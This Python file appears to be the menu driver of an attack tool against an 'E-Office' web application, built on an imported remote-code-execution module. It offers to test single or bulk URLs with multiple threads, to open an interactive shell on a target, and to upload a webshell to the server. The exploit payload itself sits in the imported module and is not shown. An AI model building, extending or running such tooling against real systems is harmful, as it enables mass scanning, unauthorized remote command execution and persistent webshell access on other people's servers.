from modules.e_office_auth_file import eoffice_auth_file_rce
import libs.custom_print as custom_print
from typing import List
import os
import configparser

config = configparser.ConfigParser()
config.read('config.properties')
php_path = config['DEFAULT']['php_path']
Threads = 3

def routes() -> None:
    try:
        os.system('clear')
        Options:int = int(input("Main Menu:\n[1]\teoffice-auth-file\t2024-03\n\n\n\n\n\nChoose:  "))
        if Options == 1:
            eoffice_auth_file()
        else:
            return
    except Exception as e:
        print(f"Error Occured:{e}")


def eoffice_auth_file() -> None:
    try:
        os.system('clear')
        global Threads
        Options:int = int(input(f"E-Office:\n[1]\tCheck single url\n[2]\tCheck multi urls\n[3]\tGet an interactive shell\n[4]\tSet threads, now is \033[91;1m{Threads}\033[0m, too many workers make mistakes.\n[5]\tUpload a shell to server.\n[0]\tReturn to main menu.\nYour options is:\t"))
        if Options == 1:
            os.system('clear')
            print("Check single url\n")
            url = input("single_url: ")
            print(url)
            eoffice = eoffice_auth_file_rce(php_path=php_path, url=url)
            eoffice.check_single_url(url=url)
        elif Options == 2:
            os.system('clear')
            print("Check multi urls\n")
            input_path = input("input_path: ")
            output_path = input("output_path(Optional): ")
            print(output_path)
            with open(input_path, "r") as f:
                myurls: List[str] = f.read().splitlines()
                eoffice = eoffice_auth_file_rce(php_path=php_path)
                eoffice.check_urls_and_write_output(myurls,output_path,Threads)
        elif Options == 3:
            os.system('clear')
            print("Get an interactive shell\n")
            url = input("single_url: ")
            eoffice = eoffice_auth_file_rce(php_path=php_path, url=url)
            eoffice.interactive_shell()
        elif Options == 4:
            os.system('clear')
            Threads = input("Set Threads:")
            os.system('clear')
            eoffice_auth_file()
        elif Options == 5:
            os.system('clear')
            print("Upload a shell\n")
            url = input("single_url: ")
            shell_path = input("shell_path: ")
            eoffice = eoffice_auth_file_rce(php_path=php_path, url=url)
            eoffice.upload_webshell(shell_path)
        elif Options == 0:
            os.system('clear')
            routes()
        else:
            custom_print("Unaccessable Options", "!")
            exit(0)
    except Exception as e:
        print(e)
